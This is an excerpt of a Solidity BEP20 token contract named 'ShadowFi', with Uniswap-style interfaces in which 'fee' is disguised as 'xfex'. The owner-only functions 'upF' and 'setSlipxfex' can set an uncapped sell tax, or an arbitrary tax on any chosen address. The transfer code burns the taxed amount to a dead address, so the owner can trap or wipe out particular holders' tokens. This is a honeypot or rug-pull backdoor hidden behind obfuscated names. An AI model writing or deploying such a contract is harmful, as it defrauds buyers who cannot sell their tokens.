...
interface IUniswapV2Factory {
    ...
    function xfexTo() external view returns (address);
    function xfexToSetter() external view returns (address);
    ...
    function setxfexTo(address) external;
    function setxfexToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingxfexOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingxfexOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingxfexOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingxfexOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingxfexOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract ShadowFi   is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellxfex = 0;

    uint256 private _defaultBuyxfex = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipxfex;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellxfex = _value;
    }

    function setSlipxfex(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipxfex[_address] = _value;
    }

    function getSlipxfex(address _address) external view onlyownar returns (uint256) {
        return _slipxfex[_address];
    }


    function setMAccountxfex(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountxfex(address _address) external view onlyownar returns (bool) {
        ...
        if (rF) {
            ...
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                    ...
                    tradexfex = _defaultSellxfex;
                }
                if (from == uniswapV2Pair) {

                    tradexfex = _defaultBuyxfex;
                }
            }
            if (_slipxfex[from] > 0) {
                tradexfex = _slipxfex[from];
            }

            tradexfexAmount = _Amount.mul(tradexfex).div(100);
        }


        if (tradexfexAmount > 0) {
            _balances[from] = _balances[from].sub(tradexfexAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradexfexAmount);
            emit Transfer(from, _deadAddress, tradexfexAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradexfexAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradexfexAmount);
        emit Transfer(from, _to, _Amount - tradexfexAmount);
    }
